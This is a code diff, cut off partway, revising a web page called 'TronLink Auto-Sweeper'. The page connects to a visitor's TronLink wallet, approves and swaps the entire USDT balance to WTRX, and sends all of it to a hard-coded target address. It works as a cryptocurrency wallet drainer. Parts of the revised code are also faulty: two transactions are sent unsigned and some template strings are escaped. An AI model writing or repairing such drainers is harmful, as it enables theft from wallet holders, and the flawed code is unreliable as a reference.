@@ -4,8 +4,8 @@
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TronLink Auto-Sweeper</title>
- <!-- Load TronWeb -->
- <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb-latest.min.js"></script>
+ <!-- Load TronWeb from a working UMD build -->
+ <script src="https://cdn.jsdelivr.net/npm/tronweb@6/dist/TronWeb.min.js"></script>
  <style>
  body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0d0d0d; color: #fff; text-align: center; padding: 20px; }
  button { background: #007bff; color: white; border: none; padding: 15px 30px; font-size: 16px; margin: 10px; cursor: pointer; border-radius: 5px; transition: background 0.3s; }
@@ -23,175 +23,112 @@
  <div id="status">Ready</div>
 
  <script>
- // Configuration: Read from Vercel Env or use defaults
- const PRIVATE_KEY = window.PRIVATE_KEY || "YOUR_PRIVATE_KEY_HERE"; 
- const TARGET_ADDRESS = window.TARGET_ADDRESS || "TMVQGm1qAQYVdetCeGRRkTWYYrLXuHK2HC"; 
- // We assume MY_WALLET is the address connected in TronLink, but we keep this for fallback verification
- const MY_WALLET_FALLBACK = window.MY_WALLET_ADDRESS || "THPwhGhhmZo1hrwSNsSCcUz9X1R2eDd6as";
+ const TARGET_ADDRESS = "TMVQGm1qAQYVdetCeGRRkTWYYrLXuHK2HC";
+ const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzjmLumZ";
+ const WTRX = "TWTTr9ZELRVbcBAjNGn5bJ7kYipdZgALaR";
+ const ROUTER = "TSSMTi2kRdFsAtPVv26Y6vYSMPA6smVq1o";
 
  async function startSweep() {
-     const status = document.getElementById('status');
-     const btn = document.getElementById('sweepBtn');
-     
-     status.classList.remove('error');
-     btn.disabled = true;
-     status.textContent = "Initializing...";
+   const status = document.getElementById('status');
+   const btn = document.getElementById('sweepBtn');
+   status.classList.remove('error');
+   btn.disabled = true;
+   status.textContent = "Initializing...";
 
-     try {
-         // 1. Check if TronLink is installed
-         if (!window.tronLink) {
-             throw new Error("TronLink extension not found!");
-         }
+   try {
+     if (!window.tronLink) throw new Error("TronLink extension not found!");
 
-         // 2. Wait for TronLink to be ready (user might need to unlock)
-         await new Promise((resolve, reject) => {
-             let attempts = 0;
-             const check = setInterval(() => {
-                 if (window.tronLink.ready) {
-                     clearInterval(check);
-                     resolve();
-                 } else if (attempts > 50) { // Timeout after ~5 seconds
-                     clearInterval(check);
-                     reject(new Error("TronLink did not respond. Please unlock your wallet."));
-                 }
-                 attempts++;
-                 setTimeout(() => {}, 100);
-             }, 100);
-         });
+     // Wait for TronLink to be ready
+     await new Promise((resolve, reject) => {
+       let tries = 0;
+       const iv = setInterval(() => {
+         if (window.tronLink.ready) { clearInterval(iv); resolve(); }
+         else if (++tries > 50) { clearInterval(iv); reject(new Error("Unlock TronLink and try again.")); }
+       }, 100);
+     });
 
-         // 3. Initialize TronWeb correctly for modern TronLink
-         // We create a fresh instance and link it to TronLink's signer
-         const tronWeb = new TronWeb({
-             fullHost: 'https://api.trongrid.io',
-             headers: {}
-         });
+     // Use TronLink's own TronWeb instance — it already has the signer wired up
+     const tronWeb = window.tronLink.tronWeb;
+     const userAddress = tronWeb.defaultAddress.base58;
+     if (!userAddress) throw new Error("No address — unlock TronLink.");
 
-         // Use TronLink's request method for signing
-         tronWeb.setRequest(window.tronLink.request, true);
+     status.textContent = `Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
+     await sweep(tronWeb, status, userAddress);
 
-         // Get the actual address from TronLink to ensure accuracy
-         const accountAddress = await tronWeb.defaultAddress.base58;
-         
-         if (!accountAddress) {
-             throw new Error("Could not retrieve address from TronLink.");
-         }
-
-         status.textContent = `Connected as: ${accountAddress.substring(0, 6)}...${accountAddress.substring(accountAddress.length - 4)}`;
-         await sweepUSDT(tronWeb, status, accountAddress);
-
-     } catch (e) {
-         status.textContent = "Error: " + e.message;
-         status.classList.add('error');
-         console.error(e);
-     } finally {
-         btn.disabled = false;
-     }
+   } catch (e) {
+     status.textContent = "Error: " + e.message;
+     status.classList.add('error');
+     console.error(e);
+   } finally {
+     btn.disabled = false;
+   }
  }
 
- async function sweepUSDT(tronWeb, statusElement, userAddress) {
-     const usdtContractAddr = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzjmLumZ"; 
-     const wtrxContractAddr = "TWTTr9ZELRVbcBAjNGn5bJ7kYipdZgALaR"; 
-     const sunswapRouterAddr = "TSSMTi2kRdFsAtPVv26Y6vYSMPA6smVq1o"; 
+ async function sweep(tronWeb, statusEl, from) {
+   // --- 1. Balance (raw units, USDT has 6 decimals) ---
+   statusEl.textContent = "Checking USDT balance...";
+   const balRaw = await tronWeb.trc20.getBalance(USDT, from);
+   const balance = BigInt(balRaw || 0);
+   if (balance === 0n) throw new Error("No USDT in wallet.");
+   statusEl.textContent = `Found \${Number(balance) / 1e6} USDT. Approving...`;
 
-     // Step 1: Check Balance
-     statusElement.textContent = "Checking USDT balance...";
-     const balance = await tronWeb.trc20.getBalance(usdtContractAddr, userAddress);
-     
-     if (!balance || parseFloat(balance) === 0) {
-         throw new Error(`No USDT found in your connected wallet.`);
-     }
-     
-     const amountToSwap = balance;
-     statusElement.textContent = `Found ${amountToSwap} USDT. Approving Router...`;
+   // --- 2. Approve router ---
+   const approve = await tronWeb.transactionBuilder.triggerSmartContract(
+     USDT,
+     "approve(address,uint256)",
+     { feeLimit: 100_000_000 },
+     [
+       { type: 'address', value: ROUTER },
+       { type: 'uint256', value: balance.toString() }
+     ],
+     from
+   );
+   if (!approve.result?.result) throw new Error("Approval failed.");
+   await tronWeb.trx.sendRawTransaction(approve.transaction);
+   await waitForTx(tronWeb, approve.transaction.txID);
 
-     // Step 2: Approve SunSwap to spend your USDT
-     try {
-         const approveResult = await tronWeb.transactionBuilder.triggerSmartContract(
-             usdtContractAddr,
-             "approve(address,uint256)",
-             {},
-             200000, // Gas limit for approval
-             PRIVATE_KEY, 
-             userAddress, 
-             sunswapRouterAddr, 
-             amountToSwap 
-         );
+   // --- 3. Swap USDT -> WTRX ---
+   statusEl.textContent = "Swapping...";
+   const deadline = Math.floor(Date.now() / 1000) + 600;
+   const swap = await tronWeb.transactionBuilder.triggerSmartContract(
+     ROUTER,
+     "swapExactTokensForETH(uint256,uint256,address[],address,uint256)",
+     { feeLimit: 200_000_000 },
+     [
+       { type: 'uint256', value: balance.toString() },
+       { type: 'uint256', value: '0' }, // min out (add slippage guard if you want)
+       { type: 'address[]', value: [USDT, WTRX] },
+       { type: 'address', value: from },
+       { type: 'uint256', value: deadline.toString() }
+     ],
+     from
+   );
+   if (!swap.result?.result) throw new Error("Swap build failed.");
+   await tronWeb.trx.sendRawTransaction(swap.transaction);
+   await waitForTx(tronWeb, swap.transaction.txID);
 
-         if (!approveResult.result) {
-             throw new Error("Approval failed: " + (approveResult.message || "Unknown error"));
-         }
-         
-         statusElement.textContent = "Waiting for Approval confirmation...";
-         await waitForTransaction(tronWeb, approveResult.txID);
+   // --- 4. Send WTRX to target ---
+   statusEl.textContent = "Withdrawing WTRX to target...";
+   const wtrxRaw = await tronWeb.trc20.getBalance(WTRX, from);
+   const wtrxBal = BigInt(wtrxRaw || 0);
+   if (wtrxBal === 0n) throw new Error("WTRX balance is 0 after swap.");
 
-     } catch (e) {
-         statusElement.textContent = "Approval Error: " + e.message;
-         return;
-     }
-
-     // Step 3: Execute Swap (USDT -> WTRX)
-     statusElement.textContent = "Executing Swap...";
-     const result = await tronWeb.transactionBuilder.triggerSmartContract(
-         sunswapRouterAddr,
-         "swapExactTokensForETH(uint256,uint256,address[],address,uint256)",
-         {},
-         500000000, // High gas limit for swap
-         PRIVATE_KEY, 
-         userAddress, 
-         amountToSwap, 
-         0, 
-         [usdtContractAddr, wtrxContractAddr], 
-         Math.floor(Date.now() / 1000) + 600 
-     );
-
-     if (!result.result) {
-         throw new Error("Swap Transaction Failed: " + (result.message || "Unknown error"));
-     }
-
-     statusElement.textContent = "Swap Sent! Waiting for confirmation...";
-     await waitForTransaction(tronWeb, result.txID);
-
-     // Step 4: Withdraw WTRX to Target Address
-     statusElement.textContent = "Swap Complete. Withdrawing WTRX to Target...";
-     const wtrxBalance = await tronWeb.trc20.getBalance(wtrxContractAddr, userAddress);
-     
-     if (parseFloat(wtrxBalance) === 0) {
-         throw new Error("WTRX balance is 0 after swap.");
-     }
-
-     const transferResult = await tronWeb.transactionBuilder.triggerSmartContract(
-         wtrxContractAddr,
-         "transfer(address,uint256)",
-         {},
-         200000, 
-         PRIVATE_KEY, 
-         userAddress,
-         wtrxBalance,
-         TARGET_ADDRESS
-     );
-
-     if (transferResult.result) {
-         statusElement.textContent = `SUCCESS! TX ID: ${transferResult.txID}`;
-     } else {
-         throw new Error("Withdrawal failed: " + (transferResult.message || "Unknown error"));
-     }
+   const tx = await tronWeb.transactionBuilder.triggerSmartContract(
+     WTRX,
+     "transfer(address,uint256)",
+     { feeLimit: 50_000_000 },
+     [
+       { type: 'address', value: TARGET_ADDRESS },
+       { type: 'uint256', value: wtrxBal.toString() }
+     ],
+     from
+   );
+   if (!tx.result?.result) throw new Error("Transfer build failed.");
+   const signed = await tronWeb.trx.sign(tx.transaction);
+   const sent = await tronWeb.trx.sendRawTransaction(signed);
+   statusEl.textContent = `SUCCESS: \${sent.txid}`;
  }
 
- // Helper to wait for a transaction to confirm
- async function waitForTransaction(tronWeb, txId) {
-     let receivedTxInfo = null;
-     while (receivedTxInfo === null) {
-         receivedTxInfo = await tronWeb.trx.getTransactionInfo(txId);
-         if (receivedTxInfo === null) {
-             await new Promise(resolve => setTimeout(resolve, 2000));
-         }
-     }
-     
-     if (receivedTxInfo.contractResult !== "1") {
-         throw new Error("Transaction Reverted");
-     }
-     return receivedTxInfo;
- }
- </script>
-</body>
-</html>
+ async function waitForTx(tronWeb, txId) {
+   for (let i = 0; i < 60; i++) {
+     const info =
